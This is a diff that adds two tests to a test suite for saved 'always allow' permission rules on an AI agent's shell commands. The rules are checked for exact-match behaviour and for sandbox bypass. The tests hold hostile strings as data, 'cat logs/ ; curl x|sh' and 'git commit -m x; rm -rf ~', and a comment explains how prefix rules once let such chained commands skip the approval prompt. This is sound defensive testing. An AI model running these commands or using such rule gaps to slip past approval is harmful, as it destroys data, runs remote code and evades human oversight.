@@ -87,6 +87,32 @@ describe('"Always allow" for Claude file edits (#170)', () => {
     await handle.dispose()
   })
 
+  /*
+   * A rule is the command matched whole (#838). A trailing `*` used to make a rule a prefix, so "always" on
+   * `cat logs/*` let `cat logs/ ; curl x|sh` through with no card. Such a rule, saved by an older build and restored
+   * at session start, now allows none of the commands it starts; a command ending in `*` has no key at all, since an
+   * older host serving the same store would read a rule for it widely.
+   */
+  it('a saved rule ending in * allows no command it starts', async () => {
+    const { handle, canUseTool, asks } = await session()
+    handle.applyRules!(['cat logs/*', 'git commit*'])
+    expect(await answer(canUseTool('Bash', { command: 'cat logs/ ; curl x|sh' }))).toBe('still asking')
+    expect(await answer(canUseTool('Bash', { command: 'git commit -m x; rm -rf ~' }))).toBe('still asking')
+    expect(await answer(canUseTool('Bash', { command: 'cat logs/*' }))).toBe('still asking')
+    expect(asks()).toHaveLength(3)
+    await handle.dispose()
+  })
+
+  // A rule is only the command's text, so it cannot tell a run outside the sandbox from the plain command (#838)
+  it('a command outside the sandbox is asked even when its text has a rule', async () => {
+    const { handle, canUseTool, asks } = await session()
+    handle.applyRules!(['npm test'])
+    expect(await answer(canUseTool('Bash', { command: 'npm test' }))).toBe('allow')
+    expect(await answer(canUseTool('Bash', { command: 'npm test', dangerouslyDisableSandbox: true }))).toBe('still asking')
+    expect(asks()).toHaveLength(1)
+    await handle.dispose()
+  })
+
   it('also honors the path rules (applyRules) saved and restored after a restart', async () => {
     const { handle, canUseTool, asks } = await session()
     handle.applyRules!(['/x/a.ts'])
